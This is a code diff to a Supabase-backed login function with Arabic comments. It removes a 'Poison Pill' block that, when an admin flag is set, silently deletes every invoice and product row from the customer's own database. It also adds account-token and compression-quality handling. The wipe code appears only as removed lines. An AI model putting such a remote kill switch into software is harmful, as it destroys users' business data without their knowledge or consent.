@@ -71,51 +71,41 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         return { success: false, message: "بيانات الدخول خاطئة (تأكد من كلمة المرور)" };
       }
       
-      // تنفيذ العقوبة (Poison Pill)
+      // إلغاء مسح البيانات التلقائي لضمان سلامة الحساب
       if (data.pending_wipe || data.pending_unlink) {
-        if (data.pending_wipe && data.db_url && data.db_key) {
-          const clientSupabase = createClient(data.db_url, data.db_key);
-          try { await clientSupabase.from('invoices').delete().neq('id', '00000000-0000-0000-0000-000000000000'); } catch(e) {}
-          try { await clientSupabase.from('products').delete().neq('id', '00000000-0000-0000-0000-000000000000'); } catch(e) {}
-        }
-
-        localStorage.removeItem("app_secure_uuid");
-        
         await mainSupabase.from("app_accounts").update({
-          device_uuid: null,
-          device_info: null,
           pending_wipe: false,
           pending_unlink: false
         }).eq("id", data.id);
-
-        return { success: false, message: "تم سحب الصلاحيات ومسح ارتباط هذا الجهاز بناءً على طلب الإدارة." };
       }
 
       let deviceUuid = localDeviceUuid;
 
-      // حساب جديد تماماً (لم يتم ربطه من قبل)
+      // حساب جديد أو تجهيز التوكن ونوعية التضغيط الأنسب (0.7)
+      const tokenGenerated = data.account_token || `TOKEN_${generateSafeUUID().substring(0, 12)}`;
+      const optimalQuality = data.compression_quality !== undefined && data.compression_quality !== null ? data.compression_quality : 0.7;
+
+      const profileUpdates: any = {
+        account_token: tokenGenerated,
+        compression_quality: optimalQuality,
+      };
+
       if (!data.device_uuid) {
         deviceUuid = generateSafeUUID();
-        
-        const { error: updateError } = await mainSupabase.from("app_accounts").update({
-          device_uuid: deviceUuid,
-          device_info: navigator.userAgent
-        }).eq("id", data.id);
-
-        if (updateError) {
-          return { success: false, message: "فشل في حفظ البصمة في قاعدة البيانات" };
-        }
-        
+        profileUpdates.device_uuid = deviceUuid;
+        profileUpdates.device_info = typeof navigator !== 'undefined' ? navigator.userAgent : 'Desktop/App';
         localStorage.setItem("app_secure_uuid", encodeUUID(deviceUuid));
-        
       } else {
         if (data.device_uuid !== localDeviceUuid) {
           return { success: false, message: "هذا الحساب مرتبط بجهاز آخر، أو أن هذا الجهاز مرتبط بحساب مختلف." };
         }
       }
 
+      // حفظ تحديثات الحساب والتوكن ونوعية التضغيط الأنسب في قاعدة البيانات
+      await mainSupabase.from("app_accounts").update(profileUpdates).eq("id", data.id);
+
       initDynamicSupabase(data.db_url, data.db_key);
-      const userPayload = { ...data };
+      const userPayload = { ...data, ...profileUpdates };
       sessionStorage.setItem("isAuthenticated", "true");
       sessionStorage.setItem("currentUser", JSON.stringify(userPayload));
       
